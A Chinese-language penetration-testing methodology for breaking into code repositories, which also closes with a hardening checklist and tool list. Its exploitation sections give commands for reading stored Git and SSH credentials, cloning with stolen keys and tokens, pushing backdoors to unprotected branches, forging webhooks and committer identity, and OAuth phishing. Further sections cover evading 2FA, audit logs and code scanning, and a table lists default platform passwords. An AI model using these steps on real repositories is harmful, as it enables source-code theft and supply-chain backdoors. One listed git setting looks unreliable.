# 代码仓库入侵方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供代码仓库入侵攻击的系统化方法
- 指导测试人员识别和利用 Git 仓库管理中的安全漏洞
- 帮助理解源代码控制系统中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 GitHub、GitLab、Bitbucket 等代码托管平台
- 适用于自托管 Git 服务器（Gitea、Gogs、GitLab CE/EE）
- 适用于企业私有代码仓库管理场景

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- 代码仓库管理员
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 专题一：代码仓库入侵

### 2.1 技术介绍

代码仓库入侵是指攻击者通过利用代码托管平台或 Git 服务器的安全漏洞、配置错误、凭证泄露等问题，获取未授权的仓库访问权限，从而窃取源代码、注入恶意代码、篡改提交历史或破坏开发流程。

**攻击面分析：**

```
┌─────────────────────────────────────────────────────────────┐
│                    代码仓库攻击面                            │
├─────────────────────────────────────────────────────────────┤
│  认证层                                                     │
│  ├── 弱口令/默认口令                                        │
│  ├── OAuth/SSO 配置错误                                     │
│  ├── PAT/SSH Key 管理不当                                   │
│  └── 会话管理漏洞                                           │
├─────────────────────────────────────────────────────────────┤
│  授权层                                                     │
│  ├── 过度权限分配                                           │
│  ├── 分支保护缺失                                           │
│  ├── Webhook 权限过大                                       │
│  └── 应用授权滥用                                           │
├─────────────────────────────────────────────────────────────┤
│  应用层                                                     │
│  ├── 平台漏洞（CVE）                                        │
│  ├── 插件/集成漏洞                                          │
│  ├── CI/CD 集成漏洞                                         │
│  └── API 滥用                                               │
└─────────────────────────────────────────────────────────────┘
```

**常见攻击手法：**

| 攻击手法 | 描述 | 危害等级 |
|---------|------|---------|
| 凭证泄露利用 | 利用泄露的 Git 凭证 | 严重 |
| 分支保护绕过 | 绕过分支保护规则推送代码 | 高 |
| PR 审查绕过 | 未经审查合并恶意代码 | 高 |
| Webhook 滥用 | 利用 Webhook 窃取代码或触发 CI/CD | 高 |
| 应用授权劫持 | 恶意 OAuth 应用获取权限 | 高 |
| SSH Key 窃取 | 窃取或使用弱 SSH Key | 严重 |
| 提交历史篡改 | 修改或伪造提交历史 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 开源项目 | 接受外部贡献 | 恶意 PR 可能注入后门 |
| 企业私有仓库 | 内部代码管理 | 离职员工可能窃取代码 |
| CI/CD 集成 | 自动构建和部署 | CI/CD 凭证可能泄露 |
| 第三方应用 | OAuth 授权应用 | 过度授权可能泄露代码 |
| 分支管理 | 功能分支开发 | 未保护分支可能被篡改 |
| Webhook 配置 | 自动通知和触发 | Webhook 可能泄露敏感信息 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别代码仓库**
```bash
# 检查常见代码托管平台
# GitHub
curl https://github.com/org-name

# GitLab
curl https://gitlab.target.com

# Gitea/Gogs
curl https://git.target.com

# 检查 .git 目录泄露
curl https://target.com/.git/config
curl https://target.com/.git/HEAD
```

**步骤二：检查公开信息**
```bash
# GitHub 信息收集
curl https://api.github.com/users/org-name
curl https://api.github.com/users/org-name/repos
curl https://api.github.com/orgs/org-name/members

# 检查公开令牌
# https://github.com/search?q=org:target+token
```

**步骤三：检查分支保护**
```bash
# GitHub API 检查分支保护
curl -H "Authorization: token TOKEN" \
  https://api.github.com/repos/org/repo/branches/main/protection

# 检查是否需要 PR 审查
# 检查是否需要状态检查
# 检查是否允许强制推送
```

#### 2.3.2 白盒测试

**步骤一：审计仓库配置**
```bash
# 检查本地 Git 配置
cat .git/config

# 检查远程仓库配置
git remote -v

# 检查 Git 钩子
ls -la .git/hooks/

# 检查 Git LFS 配置
cat .gitattributes
```

**步骤二：审计凭证存储**
```bash
# 检查 Git 凭证存储
cat ~/.git-credentials
cat ~/.netrc

# 检查 SSH 密钥
ls -la ~/.ssh/
cat ~/.ssh/config

# 检查 Git 配置中的凭证
git config --global --list
git config --list
```

**步骤三：审计 Webhook 配置**
```bash
# GitHub Webhook 检查
curl -H "Authorization: token TOKEN" \
  https://api.github.com/repos/org/repo/hooks

# 检查 Webhook URL 和配置
# 检查是否使用 HTTPS
# 检查是否有 Secret
```

### 2.4 漏洞利用方法

#### 2.4.1 凭证泄露利用

```bash
# 1. 使用泄露的凭证克隆仓库
git clone https://username:password@github.com/org/repo.git

# 2. 使用泄露的 SSH Key
chmod 600 stolen_id_rsa
GIT_SSH_COMMAND="ssh -i stolen_id_rsa" git clone git@github.com:org/repo.git

# 3. 使用泄露的 PAT
curl -H "Authorization: token ghp_xxxxxxxxxxxx" \
  https://api.github.com/user/repos
```

#### 2.4.2 分支保护绕过

```bash
# 1. 如果分支未启用保护
# 直接推送恶意代码
git checkout main
echo "malicious code" >> src/backdoor.js
git add .
git commit -m "Update"
git push origin main

# 2. 如果允许强制推送
git push -f origin malicious-branch:main

# 3. 利用管理员权限
# 如果获取了 admin 权限，可以修改保护规则
```

#### 2.4.3 PR 审查绕过

```bash
# 1. 如果项目配置了自动合并
# 创建 PR 后等待自动合并

# 2. 利用 Bot 账户
# Bot 可能自动批准 PR

# 3. 利用时间窗口
# 在维护者不活跃时提交

# 4. 小改动隐藏大恶意
# 在看似正常的 PR 中隐藏恶意代码
```

#### 2.4.4 Webhook 滥用

```bash
# 1. 如果 Webhook 无 Secret
# 可以伪造 Webhook 请求

curl -X POST https://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -H "X-GitHub-Event: push" \
  -d '{"ref": "refs/heads/main", "commits": [{"id": "malicious"}]}'

# 2. 如果 Webhook 使用 HTTP
# 可以中间人窃听

# 3. 利用 Webhook 触发 CI/CD
# 触发恶意构建
```

#### 2.4.5 提交历史篡改

```bash
# 1. 修改历史提交
git rebase -i HEAD~10
# 编辑要修改的提交

# 2. 伪造提交者信息
git config user.name "admin"
git config user.email "admin@company.com"
git commit -m "Malicious commit"

# 3. 删除敏感提交
git filter-branch --tree-filter 'rm sensitive-file.txt' HEAD
```

#### 2.4.6 应用授权劫持

```bash
# 1. 创建恶意 OAuth 应用
# 在 GitHub 注册 OAuth App

# 2. 诱导用户授权
# 通过钓鱼邮件或社交工程

# 3. 使用授权令牌访问代码
curl -H "Authorization: token oauth_token" \
  https://api.github.com/user/repos

# 4. 窃取所有可访问的仓库
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过双因素认证

```bash
# 1. 利用会话 Cookie
# 如果获取了会话 Cookie，可以绕过 2FA

# 2. 利用备份代码
# 如果获取了备份代码

# 3. 利用应用授权
# OAuth 应用授权后无需 2FA

# 4. 利用 PAT
# Personal Access Token 无需 2FA
```

#### 2.5.2 绕过审计日志

```bash
# 1. 利用 API 而非 UI
# 某些 API 操作可能不记录日志

# 2. 批量操作
# 一次性执行多个操作，增加审计难度

# 3. 删除日志
# 如果有管理员权限
```

#### 2.5.3 绕过代码扫描

```bash
# 1. 代码混淆
# 使用编码、加密隐藏恶意代码

# 2. 分阶段注入
# 第一次 PR 注入 benign 代码
# 第二次 PR 激活恶意代码

# 3. 利用依赖
# 修改依赖而非直接代码
```

---

# 第三部分：附录

## 3.1 代码仓库安全检查表

| 检查项 | 推荐配置 | 风险等级 |
|-------|---------|---------|
| 双因素认证 | 强制启用 2FA | 高 |
| 分支保护 | 启用 PR 审查和状态检查 | 高 |
| SSH Key 管理 | 定期轮换，使用强密钥 | 高 |
| PAT 管理 | 限制权限和有效期 | 高 |
| Webhook 安全 | 使用 HTTPS 和 Secret | 中 |
| 应用授权 | 最小权限原则 | 中 |
| 审计日志 | 启用并定期审查 | 中 |
| 代码扫描 | 启用自动安全扫描 | 中 |

## 3.2 Git 安全配置

```bash
# 启用提交签名
git config --global commit.gpgsign true

# 启用标签签名
git config --global tag.gpgsign true

# 验证远程分支
git config --global remote.origin.verify true

# 使用 SSH 而非 HTTPS
git remote set-url origin git@github.com:org/repo.git
```

## 3.3 常见 Git 平台默认凭证

| 平台 | 默认 URL | 默认凭证 |
|-----|---------|---------|
| GitLab CE | http://host | root/5iveL!fe |
| Gitea | http://host:3000 | admin/admin |
| Gogs | http://host:3000 | admin/admin |
| OneDev | http://host:6610 | admin/admin |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| Gitleaks | Git 凭证扫描 | https://github.com/gitleaks/gitleaks |
| TruffleHog | Git 历史凭证扫描 | https://github.com/trufflesecurity/trufflehog |
| GitGuardian | 实时凭证检测 | https://www.gitguardian.com/ |
| pre-commit | Git 预提交钩子框架 | https://pre-commit.com/ |

---

## 参考资源

- [GitHub Security Features](https://docs.github.com/en/code-security)
- [GitLab Security Guidelines](https://docs.gitlab.com/ee/security/)
- [OWASP Git Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Git_Security_Cheat_Sheet.html)
- [GitHub Security Advisories](https://github.com/security-advisories)
